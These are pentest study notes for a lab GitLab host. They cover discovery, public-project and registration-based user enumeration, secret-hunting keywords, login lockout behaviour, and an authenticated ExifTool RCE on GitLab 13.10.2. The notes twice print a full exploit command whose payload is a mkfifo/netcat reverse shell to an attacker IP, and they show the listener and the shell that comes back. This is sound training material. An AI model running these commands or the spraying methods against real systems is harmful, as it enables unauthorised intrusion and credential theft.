# GitLab – Discovery and Attacking

## Overview

GitLab is a web-based Git repository hosting platform that provides:

- Git repository hosting
- wiki functionality
- issue tracking
- CI/CD pipelines
- project management features

It started as an open-source application written in Ruby, though the modern stack includes:

- Go
- Ruby on Rails
- Vue.js

GitLab was first launched in **2014** and has grown into a major platform used by companies worldwide.

## Useful context

From the notes:

- around **1,466 employees** at the time of writing
- over **30 million registered users**
- users in **66 countries**
- many internal procedures and OKRs published publicly by GitLab itself
- companies using GitLab include:
  - Drupal
  - Goldman Sachs
  - HackerOne
  - Ticketmaster
  - Nvidia
  - Siemens

## Why it matters

GitLab is one of the most valuable applications you can encounter on an assessment because repositories may contain:

- source code
- config files
- passwords
- API keys
- tokens
- SSH private keys
- infrastructure clues
- CI/CD secrets

GitLab can expose three broad project types:

- **public** – no authentication required
- **internal** – visible to authenticated users
- **private** – restricted to specific users

Think of GitLab as both a code vault and an internal knowledge base. Even read-only access can be extremely valuable.

---

# 1. Why GitLab Is Such a Good Target

During both internal and external pentests, GitLab instances are worth close attention because they may provide:

- sensitive code
- infrastructure details
- deployment logic
- credentials accidentally committed to repos
- internal-only project access after registration
- a path to authenticated RCE in vulnerable versions

Even if exploitation is not possible, GitLab often provides enough information to support:

- password spraying
- service enumeration
- source review
- secret hunting
- lateral movement planning

---

# 2. Common Real-World Misconfigurations

The notes highlight several realistic GitLab weaknesses:

- public repositories exposing useful data
- self-registration enabled
- two-factor authentication disabled
- company email restriction not enforced
- weak passwords
- user enumeration via sign-up behaviour

GitLab is often configured to allow:

- public access to some projects
- user self-registration
- internal project access after login

If misconfigured, this can dramatically expand the attack surface.

---

# 3. Footprinting / Discovery

GitLab is usually very easy to identify.

## Login page

Browsing to the GitLab URL typically lands you on a very recognisable sign-in page with GitLab branding.

Example:

```text
http://gitlab.inlanefreight.local:8081/users/sign_in
```

That is usually sufficient to confirm GitLab.

---

# 4. Version Fingerprinting

The notes make an important point:

GitLab version enumeration is much harder **without logging in**.

The main reliable method mentioned is:

- browse to `/help` **after logging in**

## Why this matters

If you cannot:

- register an account
- obtain credentials
- log in as a valid user

then you may not be able to confidently determine the version without resorting to risky probing.

The notes recommend a sensible approach:

- avoid blindly trying multiple exploits if the version is unknown
- focus first on:
  - public projects
  - registration logic
  - secrets
  - user enumeration

## Important note

There have been serious vulnerabilities in versions such as:

- 12.9.0
- 11.4.7
- GitLab CE 13.10.3
- 13.9.3
- 13.10.2

So versioning matters a lot, but do not be reckless with exploit attempts if you cannot verify the target.

---

# 5. Public Project Enumeration

The first thing to try is the public projects page.

## Explore page

```text
http://gitlab.inlanefreight.local:8081/explore
```

This may reveal public repositories without authentication.

In the notes, a public project named:

```text
Inlanefreight dev
```

was visible.

## Why public projects matter

Even “boring” public repos may reveal:

- internal naming conventions
- API usage
- environment variables
- hostnames
- URLs
- secrets accidentally committed
- developer usernames
- commit metadata
- framework and tech stack info

Even if the repo looks like a demo project, it is still worth exploring.

---

# 6. Repository Triage

When reviewing a public or accessible repo, check:

- code
- config files
- CI/CD files
- environment examples
- old commits
- snippets
- wikis
- groups
- user lists
- issue tracker
- search results

The notes specifically call out checking:

- groups
- snippets
- help
- the built-in search function

This is exactly right. Git platforms often leak more through peripheral features than through the main code tree alone.

---

# 7. Registration as an Attack Path

A key GitLab weakness discussed in the notes is **self-registration**.

Example sign-up page:

```text
http://gitlab.inlanefreight.local:8081/users/sign_up
```

If the instance is configured to allow anyone to register, you may gain access to:

- internal repositories
- additional snippets
- more project metadata
- more users
- potentially version info via `/help`

## Why this matters

Many organisations intend GitLab to be “internal only” in practice, but leave self-registration enabled or do not restrict sign-up to company email addresses.

That can turn a public-facing GitLab into a low-friction authenticated target.

---

# 8. User Enumeration via Registration

The notes describe a useful GitLab behaviour:

- trying to register an already-taken username reveals that it exists
- trying to register with an already-used email reveals that it exists

Examples of errors include:

- username taken
- email has already been taken

## Important note

This still worked on the latest version at the time of writing in the notes.

Even if sign-up is disabled in the UI, the `/users/sign_up` page may still be reachable for enumeration.

## Why this matters

This can be used to build a valid username list for:

- password guessing
- password spraying
- credential reuse
- OSINT enrichment

The notes explicitly mention that even GitLab does not consider this alone a vulnerability unless additional impact is demonstrated, but from a pentest perspective it is still very useful.

---

# 9. Manual User/Email Enumeration

Examples from the notes:

- `root` was shown as taken
- emails could also be enumerated through registration attempts

## Practical uses

Once you have usernames or emails, you can:

- test weak passwords
- try reused credentials from breach data
- correlate with LinkedIn/OSINT
- use them against:
  - VPN
  - OWA
  - SSO
  - other apps

---

# 10. Sign-Up Restrictions and Defences

The notes mention some defensive controls that may block abuse:

- require company email addresses
- require admin approval for new accounts
- enforce 2FA
- use Fail2Ban or similar protections
- restrict GitLab by source IP if it must be exposed externally

These are worth keeping in mind when interpreting what works and what does not.

---

# 11. Logging In with a Self-Registered User

The notes walk through registering with:

```text
hacker : Welcome
```

and then logging in successfully.

After logging in, a previously hidden **internal project** became visible:

```text
Inlanefreight website
```

## Why this matters

This perfectly illustrates the danger of self-registration.

Even if public access is limited, authenticated users may gain access to:

- internal repos
- more source code
- more snippets
- internal docs
- hidden project metadata

If the newly visible project had been a real application instead of a static site, it could have exposed:

- source code
- vulnerabilities
- credentials
- hidden functionality
- admin-only routes

---

# 12. Secret Hunting in GitLab

The notes strongly emphasise that Git repositories often contain:

- hard-coded credentials
- config secrets
- SSH keys
- API tokens

This is one of the most important GitLab attack paths.

## Things to search for

Look for strings like:

- `password`
- `passwd`
- `secret`
- `token`
- `apikey`
- `api_key`
- `ssh`
- `BEGIN OPENSSH PRIVATE KEY`
- `BEGIN RSA PRIVATE KEY`
- `db_password`
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`

Also review:

- old commits
- deleted files in history
- CI variables references
- deployment scripts
- Docker configs
- Terraform files
- Ansible playbooks
- Kubernetes manifests

---

# 13. GitLab CVE Context

The notes mention that GitLab had:

- **553 CVEs** reported as of September 2021

Not all are exploitable, but some have been severe enough to cause:

- remote code execution
- data exposure
- auth bypass

That means once version info is known, vulnerability research is well worth doing.

---

# 14. Username Enumeration Script

The notes include a user enumeration script example:

```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

## Example results

It identified:

- `root`
- `bob`

as valid usernames.

## Why this matters

With a large valid user list, you can perform **controlled** password spraying using:

- common weak passwords
- organisation-themed patterns
- reused credentials from breach data

---

# 15. GitLab Login Lockout Behaviour

The notes provide useful operational detail about account lockouts.

For versions below **16.6**, GitLab defaults were:

- **10 failed login attempts**
- automatic unlock after **10 minutes**

Example config:

```ruby
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

From **GitLab 16.6 onward**, admins can configure this through the UI via:

- `max_login_attempts`
- `failed_login_attempts_unlock_period_in_minutes`

## Why this matters

When spraying GitLab, be careful not to:

- lock accounts
- disrupt the environment
- trigger alerts unnecessarily

This is especially important on production dev tooling.

---

# 16. Authenticated RCE – GitLab 13.10.2 and Lower

One of the strongest attack paths in the notes is an **authenticated RCE** affecting:

- GitLab Community Edition **13.10.2 and lower**

## Root cause

This involved an ExifTool metadata handling issue in uploaded image files.

## Why it is attractive

If:

- registration is enabled
- or you have valid credentials from OSINT / password reuse

then you may be able to go from account creation straight to code execution.

---

# 17. Exploit Example

The notes show an exploit script usage:

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

## What it does

1. authenticates
2. creates payload
3. creates a snippet / uploads payload
4. triggers code execution

## Output from the notes

```text
Successfully Authenticated
[+] RCE Triggered !!
```

## Resulting shell

Listener:

```bash
nc -lnvp 8443
```

Shell came back as:

```text
git@app04:~/gitlab-workhorse$
```

Identity:

```bash
id
uid=996(git) gid=997(git) groups=997(git)
```

## Why this matters

That gives:

- shell on the GitLab host
- access as the `git` service account
- a strong foothold for local enumeration and potential privilege escalation

---

# 18. Practical Workflow

## Step 1 – identify GitLab

Check for:

- branded login page
- `/users/sign_in`
- GitLab UI elements

## Step 2 – enumerate public projects

Browse to:

```text
/explore
```

Review:

- groups
- snippets
- help
- repo contents
- search results

## Step 3 – test self-registration

Browse to:

```text
/users/sign_up
```

Check whether:

- anyone can register
- company email is required
- admin approval is required

## Step 4 – enumerate users/emails

Use registration form behaviour or a user-enum script.

## Step 5 – log in if possible

Use:

- self-registered account
- leaked creds
- reused creds
- weak password guesses

## Step 6 – inspect new internal projects

After login, re-check:

- `/explore`
- visible repos
- snippets
- groups
- search functionality

## Step 7 – determine version if possible

Use `/help` once authenticated.

## Step 8 – research CVEs or abuse paths

If vulnerable and in scope, consider authenticated exploit paths such as the ExifTool RCE described in the notes.

---

# 19. Useful URLs

## Sign in

```text
http://gitlab.inlanefreight.local:8081/users/sign_in
```

## Sign up

```text
http://gitlab.inlanefreight.local:8081/users/sign_up
```

## Explore projects

```text
http://gitlab.inlanefreight.local:8081/explore
```

## Example admin settings page mentioned in the notes

```text
http://gitlab.inlanefreight.local:8081/admin/application_settings/general
```

---

# 20. Useful Commands

## User enumeration script

```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

## Authenticated RCE example

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

## Listener

```bash
nc -lnvp 8443
```

---

# 21. Key Takeaways

- GitLab is one of the most valuable application targets because repositories often contain secrets
- public repos alone can reveal useful infrastructure and credential material
- self-registration can dramatically expand visibility into internal projects
- GitLab user and email enumeration via the sign-up page is worth checking
- password spraying should be done carefully due to lockout behaviour
- if version and auth line up, authenticated RCE can provide a fast foothold
- even without exploitation, GitLab often provides enough data to support compromise elsewhere

---

# Tags

#gitlab
#git
#repository
#ci-cd
#user-enumeration
#credential-hunting
#secrets
#rce
#attacking-common-apps
#pentesting
#ctf
#obsidian